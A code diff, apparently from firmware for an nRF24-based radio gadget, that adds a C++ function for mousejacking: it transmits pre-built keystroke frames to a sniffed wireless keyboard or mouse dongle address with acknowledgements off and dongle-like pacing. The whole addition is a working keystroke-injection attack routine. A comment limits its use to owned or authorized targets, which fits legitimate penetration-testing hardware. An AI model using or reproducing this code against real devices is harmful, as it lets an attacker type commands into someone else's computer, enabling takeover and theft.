@@ -51,3 +51,23 @@ void nrf_scan() {
 bool    nrf_scanned() { return s_scanned; }
 int     nrf_busiest_ch() { return nrf_busiest(s_counts, NRF_CHAN); }
 uint8_t nrf_activity(int ch) { return (ch >= 0 && ch < NRF_CHAN) ? s_counts[ch] : 0; }
+
+// Transmit a mousejack keystroke stream at a sniffed dongle address. Frames are
+// built host-side by mousejack_stream(). ESB, no ACK, paced like a real dongle.
+// Bring-up: needs the nRF24, a sniffed address + channel, and an own/authorized
+// target — see docs/BRINGUP.md (NRF24 Mousejack).
+bool nrf_mousejack_inject(const uint8_t addr[5], int channel,
+                          const uint8_t frames[][10], int n) {
+  ensure();
+  if (!s_present || !addr || !frames || n <= 0) return false;
+  radio.stopListening();
+  radio.setChannel(channel);
+  radio.setAutoAck(false);
+  radio.openWritingPipe(addr);              // the dongle's ESB address (sniffed)
+  bool ok = true;
+  for (int i = 0; i < n; i++) {
+    if (!radio.write(frames[i], 10)) ok = false;
+    delayMicroseconds(1200);                // pacing between HID reports
+  }
+  return ok;
+}
